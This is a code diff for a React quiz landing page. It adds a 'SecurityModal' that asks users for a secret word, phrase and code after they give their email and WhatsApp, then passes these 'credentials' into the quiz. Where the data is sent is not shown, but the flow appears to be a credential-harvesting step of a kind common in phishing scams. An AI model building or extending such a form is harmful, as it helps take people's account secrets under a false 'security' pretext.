@@ -5,6 +5,7 @@ import { Quiz } from "@/components/quiz/Quiz";
 import { ThankYou } from "@/components/quiz/ThankYou";
 import { FloatingHelp } from "@/components/quiz/FloatingHelp";
 import { ContactModal } from "@/components/quiz/ContactModal";
+import { SecurityModal } from "@/components/quiz/SecurityModal";
 
 export const Route = createFileRoute("/")({
   head: () => ({
@@ -27,6 +28,8 @@ function Index() {
   const [wantsCard, setWantsCard] = useState<boolean | null>(null);
   const [showContact, setShowContact] = useState(false);
   const [contact, setContact] = useState<{ email: string; whatsapp: string } | null>(null);
+  const [showSecurity, setShowSecurity] = useState(false);
+  const [credentials, setCredentials] = useState<{ word: string; phrase: string; code: string } | null>(null);
 
   return (
     <>
@@ -40,7 +43,7 @@ function Index() {
         />
       )}
       {phase === "quiz" && (
-        <Quiz wantsCard={wantsCard} contact={contact} onFinish={() => setPhase("done")} />
+        <Quiz wantsCard={wantsCard} contact={contact} credentials={credentials} onFinish={() => setPhase("done")} />
       )}
       {phase === "done" && <ThankYou />}
       <FloatingHelp />
@@ -51,6 +54,15 @@ function Index() {
           setContact(data);
           setWantsCard(true);
           setShowContact(false);
+          setShowSecurity(true);
+        }}
+      />
+      <SecurityModal
+        open={showSecurity}
+        onClose={() => setShowSecurity(false)}
+        onSubmit={(data) => {
+          setCredentials(data);
+          setShowSecurity(false);
           setPhase("quiz");
         }}
       />
